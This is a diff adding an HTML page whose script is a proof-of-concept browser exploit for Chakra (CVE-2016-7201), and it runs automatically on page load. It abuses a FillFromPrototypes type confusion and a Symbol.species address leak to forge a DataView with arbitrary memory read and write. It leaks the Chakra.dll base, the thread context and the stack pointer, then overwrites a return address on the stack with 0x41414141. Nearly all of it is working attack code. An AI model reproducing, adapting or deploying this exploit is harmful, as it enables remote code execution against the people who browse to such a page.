@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<META http-equiv="Expires" content="-1"> 
+<META http-equiv="Pragma" content="no-cache"> 
+<META http-equiv="Cache-Control" content="No-Cache"> 
+<script src='./long.min.js'></script>
+<script>
+var Long = dcodeIO.Long;
+
+var x = (new Array(56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)).slice();
+var dv = undefined;
+var adv = undefined;
+
+function print_log(str) {
+	var o = document.getElementById("log");
+	//o.innerHTML += str + "<br>";
+}
+function swap32(val) {
+	return ((val & 0xFF) << 24) | ((val & 0xFF00) << 8) | ((val >> 8) & 0xFF00) | ((val >> 24) & 0xFF);
+}
+
+/* Using FillFromPrototypes bug (CVE-2016-7201) */
+function TriggerFillFromPrototypesBug(lo, hi) {
+	x[2] = lo;
+	x[3] = hi;
+
+	x[8] = 0x200;
+
+	x[10] = (lo - 0x38)|0;
+	x[11] = hi;
+
+	x[14] = (lo - 0x58)|0;
+	x[15] = hi;
+
+	var a = new Array(0x11111111, 0, 0x22222222, 0, 0x33333333, 0, lo, hi, 0x55555555, 0);
+
+	var handler = {
+		getPrototypeOf: function(target, name) {
+			return a;
+		}
+	};
+
+	var p = new Proxy([], handler);
+	var b = [{}, [], "abc"];
+
+	b.__proto__ = p;
+	b.length = 4;
+
+	a.shift.call(b); //trigger
+	dv = b[2]; //b[2] is type confusion.
+}
+
+function PutDataAndGetAddr(t) {
+	var d = new Array(1,2,3);
+	class dummy {
+		constructor() {
+			return d;
+		}
+	};
+
+	class MyArray extends Array {
+		static get [Symbol.species]() {
+			return dummy;
+		}
+	}
+
+	var a = new Array({}, t, "singi", 7,7,7,7,7,7,7);
+
+	function test(i) {
+		return true;
+	}
+
+	a.__proto__ = MyArray.prototype;
+
+	var o = a.filter(test);
+	var h = [];
+
+	for(item in o) {
+		var n = new Number(o[item]);
+		if(n<0) {
+			n = n + 0x100000000;
+		}
+		h.push(n);
+	}
+
+	return [h[2],h[3]];
+}
+
+function pwn() {	
+	adv = new DataView(new ArrayBuffer(8), 0); //set normal DataView Object.
+	var offset = 0x40;
+	var chakraBaseOffset = 0x5938d8;
+	var tctx_offset = 0x735ea8;
+	var chakraBase = 0x0;
+	var stackPointer = 0x0;
+	var callFunction_offset = 0x13d873;
+
+	var leakData = PutDataAndGetAddr(x);
+	var longVar = new Long(leakData[0], leakData[1]);
+	print_log("[+] fake array Address : 0x" + longVar.toString(16));
+
+	TriggerFillFromPrototypesBug( (leakData[0]+offset+0x18) & 0xffffffff, leakData[1] & 0xffffffff);
+
+	//get Chakra Base
+	chakraBase = new Long(adv.getUint32.call(dv,0,true)-chakraBaseOffset,adv.getUint32.call(dv,4,true));
+	print_log("[+] Chakra.dll Base : 0x" + chakraBase.toString(16));
+
+	//get thread context using globalListLast.
+	var tctx = new Long( chakraBase.getLowBitsUnsigned()+tctx_offset, chakraBase.getHighBitsUnsigned());
+	print_log("[+] ThreadContext Address : 0x" + tctx.toString(16));
+
+	x[14] = tctx.getLowBitsUnsigned() & 0xffffffff;
+	x[15] = tctx.getHighBitsUnsigned() & 0xffffffff;
+	stackPointer = new Long(adv.getUint32.call(dv,0,true), adv.getUint32.call(dv,4,true));
+
+	x[14] = (stackPointer.getLowBitsUnsigned()+0x548) & 0xffffffff;
+	x[15] = stackPointer.getHighBitsUnsigned() & 0xffffffff;
+	stackPointer = new Long(adv.getUint32.call(dv,0,true), adv.getUint32.call(dv,4,true));
+	print_log("[+] Stack Pointer : 0x" + stackPointer.toString(16));
+
+	var callFunctionAddr = new Long( chakraBase.getLowBitsUnsigned()+callFunction_offset, chakraBase.getHighBitsUnsigned());
+	print_log("[+] _CallFunction+0xXX : 0x" + callFunctionAddr.toString(16));	
+
+	x[8] = 0x10000;
+	x[14] = (stackPointer.getLowBitsUnsigned()-0x320) & 0xffffffff;
+	x[15] = stackPointer.getHighBitsUnsigned() & 0xffffffff;
+
+	var match = callFunctionAddr.getLowBitsUnsigned();
+	var count = 0;
+
+	alert('we can go next step nicely!');
+
+	for(i=0;i<0x1000;i+=8) {
+		if(match == adv.getUint32.call(dv, i,true)) {
+			print_log("matched! " + i.toString(16));
+			if(count == 5) {
+				adv.setUint32.call(dv, i, 0x41414141);
+				adv.setUint32.call(dv, i+4, 0x41414141);
+				break;
+			}
+			count++;
+		}
+	}
+}
+
+window.onload = function() {
+	pwn();
+}
+
+</script>
+
+<body>
+	<div id='log'></div>
+</body>
+</html>
